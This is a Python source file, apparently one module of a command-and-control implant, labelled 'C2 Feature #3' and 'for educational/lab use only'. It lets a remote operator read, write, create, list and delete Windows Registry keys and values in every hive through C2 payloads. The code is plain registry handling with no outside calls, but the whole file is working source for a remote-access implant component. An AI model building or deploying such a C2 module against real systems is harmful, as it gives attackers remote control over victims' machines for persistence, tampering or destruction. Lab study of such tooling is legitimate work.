"""
Registry Module — C2 Feature #3
Read / write / delete Windows Registry keys and values.
Uses the built-in `winreg` module (Windows only) or
stubs the calls with a helpful error on other platforms.
For educational/lab use only.
"""

import platform
import threading
from typing import Any

# winreg is Windows-only; import lazily so the module loads on all platforms.
try:
    import winreg
    WINREG_AVAILABLE = True
except ImportError:
    WINREG_AVAILABLE = False


# ------------------------------------------------------------------
# Hive / type maps
# ------------------------------------------------------------------
HIVE_MAP: dict[str, Any] = {}
TYPE_MAP: dict[str, Any] = {}

if WINREG_AVAILABLE:
    HIVE_MAP = {
        "HKLM": winreg.HKEY_LOCAL_MACHINE,
        "HKCU": winreg.HKEY_CURRENT_USER,
        "HKCR": winreg.HKEY_CLASSES_ROOT,
        "HKU":  winreg.HKEY_USERS,
        "HKCC": winreg.HKEY_CURRENT_CONFIG,
    }
    TYPE_MAP = {
        "REG_SZ":        winreg.REG_SZ,
        "REG_DWORD":     winreg.REG_DWORD,
        "REG_QWORD":     winreg.REG_QWORD,
        "REG_BINARY":    winreg.REG_BINARY,
        "REG_EXPAND_SZ": winreg.REG_EXPAND_SZ,
        "REG_MULTI_SZ":  winreg.REG_MULTI_SZ,
    }


def _rev_type(code: int) -> str:
    """Reverse-lookup a REG_* name from its integer code."""
    if WINREG_AVAILABLE:
        for name, val in TYPE_MAP.items():
            if val == code:
                return name
    return str(code)


class RegistryModule:
    """Windows Registry editor exposed through the C2 protocol."""

    def __init__(self):
        self._lock = threading.Lock()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def handle(self, payload: dict) -> dict:
        """
        Expected payload keys:
            action    : "read_value" | "write_value" | "delete_value"
                        | "list_keys" | "list_values" | "create_key" | "delete_key"
            hive      : "HKLM" | "HKCU" | "HKCR" | "HKU" | "HKCC"
            key_path  : str   e.g. "SOFTWARE\\\\MyApp"
            value_name: str   (for read_value / write_value / delete_value)
            value_data: any   (for write_value)
            value_type: str   (for write_value, default "REG_SZ")
        """
        if not WINREG_AVAILABLE:
            return {"status": "error",
                    "message": "Registry module is only available on Windows."}

        action = payload.get("action", "")
        handlers = {
            "read_value":   self._read_value,
            "write_value":  self._write_value,
            "delete_value": self._delete_value,
            "list_keys":    self._list_keys,
            "list_values":  self._list_values,
            "create_key":   self._create_key,
            "delete_key":   self._delete_key,
        }
        fn = handlers.get(action)
        if fn is None:
            return {"status": "error", "message": f"Unknown registry action: {action!r}"}
        return fn(payload)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _resolve_hive(self, name: str):
        hive = HIVE_MAP.get(name.upper())
        if hive is None:
            raise ValueError(f"Unknown hive: {name!r}. Choose from {list(HIVE_MAP)}")
        return hive

    # ------------------------------------------------------------------
    # Action implementations
    # ------------------------------------------------------------------

    def _read_value(self, p: dict) -> dict:
        hive      = self._resolve_hive(p["hive"])
        key_path  = p["key_path"]
        val_name  = p.get("value_name", "")

        try:
            with winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ) as key:
                data, reg_type = winreg.QueryValueEx(key, val_name)
            return {"status": "ok", "value_name": val_name,
                    "data": data, "type": _rev_type(reg_type)}
        except FileNotFoundError:
            return {"status": "error", "message": f"Key or value not found: {key_path}\\{val_name}"}
        except PermissionError:
            return {"status": "error", "message": "Access denied (need elevated privileges)"}
        except OSError as exc:
            return {"status": "error", "message": str(exc)}

    def _write_value(self, p: dict) -> dict:
        hive      = self._resolve_hive(p["hive"])
        key_path  = p["key_path"]
        val_name  = p.get("value_name", "")
        val_data  = p["value_data"]
        type_name = p.get("value_type", "REG_SZ")
        reg_type  = TYPE_MAP.get(type_name)
        if reg_type is None:
            return {"status": "error", "message": f"Unknown type: {type_name!r}"}

        try:
            with winreg.OpenKey(hive, key_path, 0,
                                winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, val_name, 0, reg_type, val_data)
            return {"status": "ok",
                    "message": f"Written {val_name!r} = {val_data!r} ({type_name})"}
        except FileNotFoundError:
            return {"status": "error", "message": f"Key not found: {key_path}"}
        except PermissionError:
            return {"status": "error", "message": "Access denied (need elevated privileges)"}
        except OSError as exc:
            return {"status": "error", "message": str(exc)}

    def _delete_value(self, p: dict) -> dict:
        hive     = self._resolve_hive(p["hive"])
        key_path = p["key_path"]
        val_name = p["value_name"]

        try:
            with winreg.OpenKey(hive, key_path, 0,
                                winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, val_name)
            return {"status": "ok", "message": f"Deleted value {val_name!r}"}
        except FileNotFoundError:
            return {"status": "error", "message": "Value not found"}
        except PermissionError:
            return {"status": "error", "message": "Access denied"}
        except OSError as exc:
            return {"status": "error", "message": str(exc)}

    def _list_keys(self, p: dict) -> dict:
        hive     = self._resolve_hive(p["hive"])
        key_path = p["key_path"]

        keys = []
        try:
            with winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ) as key:
                idx = 0
                while True:
                    try:
                        keys.append(winreg.EnumKey(key, idx))
                        idx += 1
                    except OSError:
                        break
            return {"status": "ok", "subkeys": keys}
        except (FileNotFoundError, PermissionError, OSError) as exc:
            return {"status": "error", "message": str(exc)}

    def _list_values(self, p: dict) -> dict:
        hive     = self._resolve_hive(p["hive"])
        key_path = p["key_path"]

        values = []
        try:
            with winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ) as key:
                idx = 0
                while True:
                    try:
                        name, data, reg_type = winreg.EnumValue(key, idx)
                        values.append({"name": name, "data": data,
                                       "type": _rev_type(reg_type)})
                        idx += 1
                    except OSError:
                        break
            return {"status": "ok", "values": values}
        except (FileNotFoundError, PermissionError, OSError) as exc:
            return {"status": "error", "message": str(exc)}

    def _create_key(self, p: dict) -> dict:
        hive     = self._resolve_hive(p["hive"])
        key_path = p["key_path"]

        try:
            handle, _ = winreg.CreateKeyEx(hive, key_path, 0,
                                           winreg.KEY_WRITE)
            winreg.CloseKey(handle)
            return {"status": "ok", "message": f"Key created: {key_path}"}
        except PermissionError:
            return {"status": "error", "message": "Access denied"}
        except OSError as exc:
            return {"status": "error", "message": str(exc)}

    def _delete_key(self, p: dict) -> dict:
        hive     = self._resolve_hive(p["hive"])
        key_path = p["key_path"]

        try:
            winreg.DeleteKey(hive, key_path)
            return {"status": "ok", "message": f"Key deleted: {key_path}"}
        except FileNotFoundError:
            return {"status": "error", "message": "Key not found"}
        except PermissionError:
            return {"status": "error", "message": "Access denied"}
        except OSError as exc:
            return {"status": "error", "message": str(exc)}
